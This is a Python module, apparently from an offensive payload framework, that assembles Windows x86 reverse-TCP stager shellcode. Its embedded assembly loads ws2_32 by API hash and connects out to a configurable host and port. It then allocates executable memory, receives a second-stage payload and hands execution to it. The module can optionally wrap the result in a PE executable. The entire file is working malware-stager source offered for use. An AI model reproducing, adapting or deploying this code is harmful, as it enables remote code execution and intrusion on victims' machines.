
from keystone import *  # code assembler
from payloads.lib.get_api_shellcode import get_api_shellcode
from payloads.lib.exefile import exefile
import struct
import socket

HOST="127.0.0.1"    # Default Host Address
PORT=4444           # Default Port Number
FORMAT="raw"        # Default Format

class reverse_tcp(object):
    def __init__(self) -> None:
        self.name = type(self).__name__
        self.platform = "windows"
        self.arch = "x86"
        self.sctype = "stager"
        self.description = "Reverse TCP connection to target machine."
        # Add your extra configuration here
        

    def build_shellcode(self) -> tuple[bytes, int]:
        mz = exefile().mz_pe_header
        gas = get_api_shellcode()
        gas_sc, cnt = gas.assemble()

        host_be = struct.unpack("<I", socket.inet_aton(HOST))[0]
        port_word = PORT.to_bytes((PORT.bit_length() + 7) // 8, 'little')
        #-----------------------
        rtcp='''
                pop ebp
                push 00003233h                      ;Push '23' to the stack
                push 5F327377h                      ;Push '_2sw' to the stack
                push esp                            ;to form 'ws2_32' string in stack
                push 0726774Ch                      ;hash("kernel32.dll", "LoadLibraryA")
                mov eax, ebp
                call eax                            ;LoadLibraryA("ws2_32")

                mov eax, 000000190h
                sub esp, eax
                push esp                            ;[out] LPWSDATA
                push eax                        
                push 0006B8029h                     ;hash("ws2_32.dll", "WSAStartup")
                call ebp
                push 0Ah                            ;number of connection attempt

            start_socket:
                push 0x{0:04X}                      ;inet_addr
                push 0x{1}0002                      ;htons(port) | AF_INET
                mov esi, esp
                push eax
                push eax
                push eax
                push eax
                inc eax 
                push eax                            ;EAX=1 -> SOCK_STREAM -> type
                inc eax        
                push eax                            ;EAX=2 -> AF_INET -> af
                push 0E0DF0FEAh                     ;hash("ws2_32.dll", "WSASocketA")
                call ebp
                xchg edi, eax                       ;EDI-> socket

            try_connect:
                push 10h                            ;namelen
                push esi                            ;sockaddr* name
                push edi                            ;socket s
                push 06174A599h                     ;hash("ws2_32.dll", "connect")
                call ebp
                test eax, eax
                jz start_recv
                dec dword ptr[esi+8]                ;decrement number of connection attempt
                jnz try_connect

            call_exit:
                call exit_code

            start_recv:
                push 0                              ;flags
                push 4                              ;len
                push esi                            ;char *buf
                push edi                            ;socket s
                push 05FC8D902h                     ;hash("ws2_32.dll","recv")
                call ebp
                cmp eax, 0
                jle close_socket
                mov esi, [esi]
                push 40h                            ;PAGE_EXECUTE_READWRITE ->flProtect
                push 000001000h                     ;MEM_COMMIT -> flAllocationType
                push esi                            ;dwSize
                push 0
                push 0E553A458h                     ;hash("kernel32.dll", "VirtualAlloc")
                call ebp
                xchg ebx, eax
                push ebx

            recv_again:
                push 0                              ;flags
                push esi                            ;len
                push ebx                            ;char *buf
                push edi                            ;socket s
                push 05FC8D902h                     ;hash("ws2_32.dll","recv")
                call ebp
                cmp eax, 0
                jge recv_loop
                pop eax
                push 000004000h
                push 0
                push eax
                push 0300F2F0Bh                     ;hash("kernel32.dll","VirtualFree")
                call ebp

            close_socket:
                push edi                            ;socket s
                push 0614D6E75h                     ;hash("ws2_32.dll","closesocket")
                call ebp
                pop esi
                pop esi
                dec dword ptr[esp]
                jnz start_socket
                jmp call_exit

            recv_loop:
                add ebx, eax                    
                sub esi, eax                        ;ESI should contain the length of data received
                jnz recv_again
                ret                                 ;pass execution control
                                                    ;to the received data

            exit_code:
                mov ebx, 056A2B5F0h   
                push 0
                push ebx
                call ebp
        '''.format(host_be, port_word.hex())
        rtcp = rtcp.split("\n")
        o = []
        for d in rtcp:
            if len(d) <= 0:
                continue
            s = d.find(";")
            if s < 0:
                s=0
                o.append(d[s:])
            else:
                o.append(d.replace(d[s:], ""))
        rtcp = "\n".join(o)
        # Assemble
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        rtcp_enc, cnt = ks.asm(rtcp)
        asm = bytes(gas_sc) + bytes(rtcp_enc)
        #-----------------------
        # The MZHeader that was used has 1 section
        # the section has FileAlignment of 0x200 bytes 
        # Pad with zeroes for file alignment
        # For Windows Executable
        if FORMAT.upper() == "EXE":
            asmlen = len(asm)
            zpad = 512 - asmlen
            zpad = [0 for n in range(zpad)]
            asm += bytes(zpad)
            asm = mz + asm

        return asm, len(asm)
        

